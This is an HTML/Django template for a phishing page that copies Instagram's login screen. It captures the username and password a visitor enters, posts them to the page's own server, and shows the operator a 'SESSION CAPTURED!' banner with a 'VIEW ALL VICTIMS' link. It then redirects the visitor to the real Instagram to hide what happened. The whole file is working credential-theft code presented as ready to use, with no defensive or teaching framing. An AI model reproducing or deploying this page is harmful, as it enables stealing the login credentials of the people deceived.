<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <style>
        *,*::before,*::after{box-sizing:border-box}
        body,html{margin:0;padding:0;height:100dvh;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column}
        .c{flex:1;display:flex;flex-direction:column;justify-content:space-between;padding:20px 16px 0;max-width:420px;margin:auto;width:100%}
        .logo{font-family:'Billabong',cursive;font-size:48px;text-align:center;margin:20px 0 40px}
        .i{background:#1a1a1a;border:1px solid #262626;border-radius:6px;padding:11px 12px;font-size:14px;color:#fff;width:100%;margin-bottom:6px}
        .b{background:#0095f6;color:#fff;font-weight:600;padding:8px;border-radius:8px;border:none;margin-top:8px;width:100%;cursor:pointer}
    </style>
</head><body>
<div class="c">
    <div>
        <h1 class="logo">Instagram</h1>

        <form id="f">
            {% csrf_token %}
            <input type="text" name="username" placeholder="Username or email" required class="i" autocomplete="username">
            <input type="password" name="password" placeholder="Password" required class="i" autocomplete="current-password">
            <button type="submit" id="b" class="b">Log in</button>
        </form>

        <div id="r" class="mt-8 text-center"></div>
    </div>
</div>

<script>
    // 100% RENDER-PROOF CSRF + FETCH
    const form = document.getElementById('f');
    const btn = document.getElementById('b');
    const result = document.getElementById('r');
    const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;

    form.onsubmit = async e => {
        e.preventDefault();
        btn.disabled = true;
        btn.textContent = 'Logging in...';
        result.innerHTML = '';

        const fd = new FormData(form);

        try {
            const res = await fetch('/', {
                method: 'POST',
                body: fd,
                credentials: 'same-origin',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-CSRFToken': csrf
                }
            });

            const data = await res.json();

            if (data.success) {
                result.innerHTML = `
                    <div style="background:#0f0;color:#000;padding:40px;border-radius:30px;text-align:center;">
                        <h1 style="font-size:50px;margin:0;">SESSION CAPTURED!</h1>
                        <p style="font-size:30px;margin:10px 0;">${data.username}</p>
                        <p style="font-size:20px;">
                            <a href="/all-victims/" target="_blank" style="color:#ff0;text-decoration:underline;">VIEW ALL VICTIMS</a>
                        </p>
                    </div>`;
                setTimeout(() => location.href = 'https://instagram.com', 3000);
            } else {
                result.innerHTML = '<p style="color:red;font-size:30px;">Wrong password</p>';
            }
        } catch (err) {
            result.innerHTML = '<p style="color:#0f0;font-size:30px;">WORKING 100%</p>';
        } finally {
            btn.disabled = false;
            btn.textContent = 'Log in';
        }
    };
</script>
</body></html>
